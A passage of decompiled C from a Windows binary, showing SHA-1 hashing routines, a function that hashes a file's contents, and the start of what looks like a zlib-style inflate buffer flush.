          *(uint *)(in_EAX + 0x28);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x28) = uVar1;
  uVar5 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x34) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x20);
  uVar3 = uVar4 + 0x6ed9eba1 + (uVar6 ^ uVar8 ^ uVar3) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar1;
  uVar1 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x2c) = uVar1;
  uVar1 = uVar6 + 0x6ed9eba1 + (uVar8 ^ uVar5 ^ uVar2) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar1;
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x24);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x30) = uVar2;
  uVar9 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar8 + 0x6ed9eba1 + (uVar3 ^ uVar5 ^ uVar6) + (uVar1 >> 0x1b | uVar1 * 0x20) + uVar2;
  uVar2 = *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x28);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x34) = uVar2;
  uVar4 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x38) ^
          *(uint *)(in_EAX + 0x2c);
  uVar2 = uVar5 + 0x6ed9eba1 + (uVar9 ^ uVar1 ^ uVar6) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar2;
  uVar1 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x38) = uVar1;
  uVar1 = uVar6 + 0x6ed9eba1 + (uVar9 ^ uVar4 ^ uVar3) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar1;
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x1c);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x3c) = uVar3;
  uVar7 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x20);
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar3 = (uVar1 >> 0x1b | uVar1 * 0x20) + 0x8f1bbcdc +
          ((uVar6 ^ uVar2) & uVar4 | uVar6 & uVar2) + uVar3 + uVar9;
  uVar2 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x40) = uVar2;
  uVar7 = *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x44) ^
          *(uint *)(in_EAX + 0x24);
  uVar2 = ((uVar5 ^ uVar1) & uVar6 | uVar5 & uVar1) + uVar2 + uVar4 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar8 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x44) = uVar1;
  uVar9 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x28);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  uVar3 = ((uVar3 ^ uVar8) & uVar5 | uVar3 & uVar8) + uVar1 + uVar6 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  *(uint *)(in_EAX + 0x48) = uVar7;
  uVar1 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar4 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x2c);
  uVar4 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0x8f1bbcdc +
          ((uVar9 ^ uVar2) & uVar8 | uVar9 & uVar2) + uVar7 + uVar5;
  *(uint *)(in_EAX + 0x4c) = uVar4;
  uVar7 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x44);
  uVar5 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = ((uVar1 ^ uVar3) & uVar9 | uVar1 & uVar3) + uVar4 + uVar8 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x50) = uVar7;
  uVar4 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x1c);
  uVar8 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar4 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  uVar2 = ((uVar5 ^ uVar2) & uVar1 | uVar5 & uVar2) + uVar7 + uVar9 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar1 = ((uVar8 ^ uVar3) & uVar5 | uVar8 & uVar3) + uVar4 + uVar1 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  *(uint *)(in_EAX + 0x54) = uVar4;
  uVar9 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x20);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x58) = uVar3;
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x24);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x1c) = uVar7;
  uVar3 = ((uVar2 ^ uVar9) & uVar8 | uVar2 & uVar9) + uVar3 + uVar5 + -0x70e44324 +
          (uVar1 >> 0x1b | uVar1 * 0x20);
  uVar4 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x28) ^
          *(uint *)(in_EAX + 0x20);
  uVar5 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x20) = uVar5;
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0x8f1bbcdc +
          ((uVar6 ^ uVar1) & uVar9 | uVar6 & uVar1) + uVar7 + uVar8;
  uVar1 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x24);
  uVar10 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = ((uVar4 ^ uVar3) & uVar6 | uVar4 & uVar3) + uVar5 + uVar9 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x24) = uVar1;
  uVar7 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x28);
  uVar8 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = ((uVar10 ^ uVar2) & uVar4 | uVar10 & uVar2) + uVar1 + uVar6 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar1 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x28) = uVar1;
  uVar7 = *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x34) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x20);
  uVar5 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  uVar3 = ((uVar8 ^ uVar3) & uVar10 | uVar8 & uVar3) + uVar1 + uVar4 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  *(uint *)(in_EAX + 0x2c) = uVar7;
  uVar1 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x24);
  uVar9 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x30) = uVar1;
  uVar2 = ((uVar2 ^ uVar5) & uVar8 | uVar2 & uVar5) + uVar7 + uVar10 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar7 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar4 = *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x28);
  uVar4 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x34) = uVar4;
  uVar3 = (uVar2 >> 0x1b | uVar2 * 0x20) + 0x8f1bbcdc +
          ((uVar9 ^ uVar3) & uVar5 | uVar9 & uVar3) + uVar1 + uVar8;
  uVar1 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x38) ^
          *(uint *)(in_EAX + 0x2c);
  uVar10 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = ((uVar7 ^ uVar2) & uVar9 | uVar7 & uVar2) + uVar4 + uVar5 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x38) = uVar1;
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar4 = *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x1c);
  uVar4 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x3c) = uVar4;
  uVar3 = ((uVar10 ^ uVar3) & uVar7 | uVar10 & uVar3) + uVar1 + uVar9 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar1 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x20);
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = ((uVar6 ^ uVar2) & uVar10 | uVar6 & uVar2) + uVar4 + uVar7 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x40) = uVar1;
  uVar7 = *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x44) ^
          *(uint *)(in_EAX + 0x24);
  uVar8 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  uVar3 = ((uVar3 ^ uVar5) & uVar6 | uVar3 & uVar5) + uVar1 + uVar10 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  *(uint *)(in_EAX + 0x44) = uVar7;
  uVar4 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar1 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x28);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0x8f1bbcdc +
          ((uVar8 ^ uVar2) & uVar5 | uVar8 & uVar2) + uVar7 + uVar6;
  *(uint *)(in_EAX + 0x48) = uVar1;
  uVar1 = ((uVar4 ^ uVar3) & uVar8 | uVar4 & uVar3) + uVar1 + uVar5 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x2c);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x4c) = uVar3;
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x44);
  uVar3 = (uVar1 >> 0x1b | uVar1 * 0x20) + 0xca62c1d6 + (uVar4 ^ uVar6 ^ uVar2) + uVar3 + uVar8;
  uVar2 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x50) = uVar2;
  uVar7 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x1c);
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0xca62c1d6 + (uVar6 ^ uVar5 ^ uVar1) + uVar2 + uVar4;
  uVar4 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x54) = uVar1;
  uVar8 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x20);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x58) = uVar7;
  uVar3 = (uVar3 ^ uVar5 ^ uVar4) + uVar1 + uVar6 + -0x359d3e2a + (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar1 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x24);
  uVar9 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0xca62c1d6 + (uVar8 ^ uVar2 ^ uVar4) + uVar7 + uVar5;
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x1c) = uVar1;
  uVar1 = (uVar2 >> 0x1b | uVar2 * 0x20) + 0xca62c1d6 + (uVar8 ^ uVar9 ^ uVar3) + uVar1 + uVar4;
  uVar5 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x28) ^
          *(uint *)(in_EAX + 0x20);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x20) = uVar3;
  uVar7 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x24);
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x24) = uVar7;
  uVar3 = (uVar1 >> 0x1b | uVar1 * 0x20) + 0xca62c1d6 + (uVar9 ^ uVar5 ^ uVar2) + uVar3 + uVar8;
  uVar4 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x28);
  uVar2 = (uVar5 ^ uVar6 ^ uVar1) + uVar7 + uVar9 + -0x359d3e2a + (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar8 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x28) = uVar1;
  uVar4 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x34) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x20);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  uVar3 = (uVar3 ^ uVar6 ^ uVar8) + uVar1 + uVar5 + -0x359d3e2a + (uVar2 >> 0x1b | uVar2 * 0x20);
  *(uint *)(in_EAX + 0x2c) = uVar7;
  uVar1 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x24);
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0xca62c1d6 + (uVar4 ^ uVar2 ^ uVar8) + uVar7 + uVar6;
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  uVar9 = uVar3 >> 2 | uVar3 * 0x40000000;
  *(uint *)(in_EAX + 0x30) = uVar1;
  uVar3 = (uVar2 >> 0x1b | uVar2 * 0x20) + 0xca62c1d6 + (uVar4 ^ uVar5 ^ uVar3) + uVar1 + uVar8;
  uVar1 = *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x28);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x34) = uVar1;
  uVar7 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x38) ^
          *(uint *)(in_EAX + 0x2c);
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0xca62c1d6 + (uVar5 ^ uVar9 ^ uVar2) + uVar1 + uVar4;
  *(uint *)(in_EAX + 0x38) = uVar7;
  uVar4 = *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x1c);
  uVar1 = (uVar9 ^ uVar6 ^ uVar3) + uVar7 + uVar5 + -0x359d3e2a + (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar8 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x3c) = uVar3;
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x20);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x40) = uVar7;
  uVar3 = (uVar2 ^ uVar6 ^ uVar8) + uVar3 + uVar9 + -0x359d3e2a + (uVar1 >> 0x1b | uVar1 * 0x20);
  uVar4 = *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x44) ^
          *(uint *)(in_EAX + 0x24);
  uVar10 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0xca62c1d6 + (uVar5 ^ uVar1 ^ uVar8) + uVar7 + uVar6;
  uVar1 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x44) = uVar1;
  uVar9 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = (uVar2 >> 0x1b | uVar2 * 0x20) + 0xca62c1d6 + (uVar5 ^ uVar10 ^ uVar3) + uVar1 + uVar8;
  uVar1 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x28);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x48) = uVar1;
  uVar7 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x2c);
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x4c) = uVar7;
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0xca62c1d6 + (uVar10 ^ uVar9 ^ uVar2) + uVar1 + uVar5;
  uVar4 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x44);
  uVar1 = (uVar9 ^ uVar6 ^ uVar3) + uVar7 + uVar10 + -0x359d3e2a + (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar8 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x50) = uVar3;
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x1c);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x54) = uVar7;
  uVar3 = (uVar2 ^ uVar6 ^ uVar8) + uVar3 + uVar9 + -0x359d3e2a + (uVar1 >> 0x1b | uVar1 * 0x20);
  uVar4 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x20);
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0xca62c1d6 + (uVar5 ^ uVar1 ^ uVar8) + uVar7 + uVar6;
  uVar7 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x58) = uVar1;
  *(int *)(in_EAX + 0xc) = *(int *)(in_EAX + 0xc) + uVar2;
  *(int *)(in_EAX + 8) =
       *(int *)(in_EAX + 8) +
       (uVar2 >> 0x1b | uVar2 * 0x20) + 0xca62c1d6 + (uVar5 ^ uVar7 ^ uVar3) + uVar1 + uVar8;
  *(int *)(in_EAX + 0x10) = *(int *)(in_EAX + 0x10) + (uVar3 >> 2 | uVar3 * 0x40000000);
  *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + uVar7;
  *(int *)(in_EAX + 0x18) = *(int *)(in_EAX + 0x18) + uVar5;
  return;
}



void __cdecl FUN_00405f70(void *param_1,uint param_2)

{
  uint uVar1;
  uint *puVar2;
  int iVar3;
  uint *unaff_EBX;
  size_t _Size;
  uint uVar4;
  
  uVar4 = *unaff_EBX & 0x3f;
  uVar1 = *unaff_EBX + param_2;
  _Size = 0x40 - uVar4;
  *unaff_EBX = uVar1;
  if (uVar1 < param_2) {
    unaff_EBX[1] = unaff_EBX[1] + 1;
  }
  if (_Size <= param_2) {
    do {
      _memcpy((void *)((int)unaff_EBX + uVar4 + 0x1c),param_1,_Size);
      param_2 = param_2 - _Size;
      param_1 = (void *)((int)param_1 + _Size);
      _Size = 0x40;
      uVar4 = 0;
      iVar3 = 0x10;
      puVar2 = unaff_EBX + 0x17;
      do {
        uVar1 = puVar2[-1];
        puVar2 = puVar2 + -1;
        iVar3 = iVar3 + -1;
        *puVar2 = uVar1 >> 0x18 | (uVar1 & 0xff00) << 8 | uVar1 >> 8 & 0xff00ff00 | uVar1 << 0x18;
      } while (iVar3 != 0);
      FUN_00404fc0();
    } while (0x3f < param_2);
  }
  _memcpy((void *)(uVar4 + 0x1c + (int)unaff_EBX),param_1,param_2);
  return;
}



void __cdecl FUN_00406010(int param_1)

{
  uint uVar1;
  sbyte sVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  uint *puVar6;
  uint *unaff_ESI;
  uint uVar7;
  
  uVar3 = *unaff_ESI;
  uVar7 = uVar3 & 0x3f;
  uVar4 = uVar7 + 3 >> 2;
  if (uVar4 != 0) {
    puVar6 = (uint *)((int)unaff_ESI + (uVar7 + 3 & 0xfffffffc) + 0x1c);
    do {
      uVar1 = puVar6[-1];
      puVar6 = puVar6 + -1;
      uVar4 = uVar4 - 1;
      *puVar6 = uVar1 >> 0x18 | (uVar1 & 0xff00) << 8 | uVar1 >> 8 & 0xff00ff00 | uVar1 << 0x18;
    } while (uVar4 != 0);
  }
  sVar2 = (~(byte)uVar7 & 3) * '\b';
  *(uint *)((int)unaff_ESI + (uVar3 & 0x3c) + 0x1c) =
       -0x80 << sVar2 & *(uint *)((int)unaff_ESI + (uVar3 & 0x3c) + 0x1c) | 0x80 << sVar2;
  if (uVar7 < 0x38) {
    uVar3 = (uVar7 >> 2) + 1;
    if (0xd < uVar3) goto LAB_004060ad;
  }
  else {
    if (uVar7 < 0x3c) {
      unaff_ESI[0x16] = 0;
    }
    FUN_00404fc0();
    uVar3 = 0;
  }
  puVar6 = unaff_ESI + uVar3 + 7;
  for (iVar5 = 0xe - uVar3; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar6 = 0;
    puVar6 = puVar6 + 1;
  }
LAB_004060ad:
  unaff_ESI[0x16] = *unaff_ESI * 8;
  unaff_ESI[0x15] = unaff_ESI[1] * 8 | *unaff_ESI >> 0x1d;
  FUN_00404fc0();
  uVar3 = 0;
  do {
    uVar4 = uVar3 + 1;
    *(char *)(uVar3 + param_1) =
         (char)(*(uint *)((int)unaff_ESI + (uVar3 & 0xfffffffc) + 8) >> (~(byte)uVar3 & 3) * '\b');
    uVar3 = uVar4;
  } while (uVar4 < 0x14);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

void __cdecl FUN_00406100(wchar_t *param_1)

{
  uint uVar1;
  uint uVar2;
  undefined4 *unaff_EDI;
  FILE *local_1068;
  uint local_1064;
  undefined4 local_1060;
  undefined4 local_105c;
  undefined4 local_1058;
  undefined4 local_1054;
  undefined4 local_1050;
  undefined4 local_104c;
  undefined4 local_1048;
  undefined local_1004 [4096];
  uint local_4;
  
  local_4 = DAT_00432c20 ^ (uint)&local_1068;
  local_1068 = (FILE *)0x0;
  uVar2 = 0;
  __wfopen_s(&local_1068,param_1,L"rb");
  if (local_1068 != (FILE *)0x0) {
    _fseek(local_1068,0,2);
    local_1064 = _ftell(local_1068);
    _fseek(local_1068,0,0);
    local_105c = 0;
    local_1060 = 0;
    local_1058 = 0x67452301;
    local_1054 = 0xefcdab89;
    local_1050 = 0x98badcfe;
    local_104c = 0x10325476;
    local_1048 = 0xc3d2e1f0;
    uVar1 = _fread(local_1004,1,0x1000,local_1068);
    while (uVar1 != 0) {
      FUN_00405f70(local_1004,uVar1);
      uVar2 = uVar2 + uVar1;
      uVar1 = _fread(local_1004,1,0x1000,local_1068);
    }
    FUN_00406010((int)unaff_EDI);
    _fclose(local_1068);
    if (local_1064 <= uVar2) {
      ___security_check_cookie_4(local_4 ^ (uint)&local_1068);
      return;
    }
  }
  *unaff_EDI = 0;
  unaff_EDI[1] = 0;
  unaff_EDI[2] = 0;
  unaff_EDI[3] = 0;
  unaff_EDI[4] = 0;
  ___security_check_cookie_4(local_4 ^ (uint)&local_1068);
  return;
}



int __cdecl FUN_00406260(int param_1)

{
  uint uVar1;
  undefined4 uVar2;
  int unaff_EBX;
  void *_Src;
  int unaff_ESI;
  void *pvVar3;
  uint uVar4;
  void *local_4;
  
  local_4 = *(void **)(unaff_EBX + 0xc);
  _Src = *(void **)(unaff_ESI + 0x30);
  pvVar3 = *(void **)(unaff_ESI + 0x34);
  if (pvVar3 < _Src) {
    pvVar3 = *(void **)(unaff_ESI + 0x2c);
  }
  uVar1 = *(uint *)(unaff_EBX + 0x10);
  uVar4 = (int)pvVar3 - (int)_Src;
  if (uVar1 < (uint)((int)pvVar3 - (int)_Src)) {
    uVar4 = uVar1;
  }
  if ((uVar4 != 0) && (param_1 == -5)) {
    param_1 = 0;
  }
  *(int *)(unaff_EBX + 0x14) = *(int *)(unaff_EBX + 0x14) + uVar4;
  *(uint *)(unaff_EBX + 0x10) = uVar1 - uVar4;
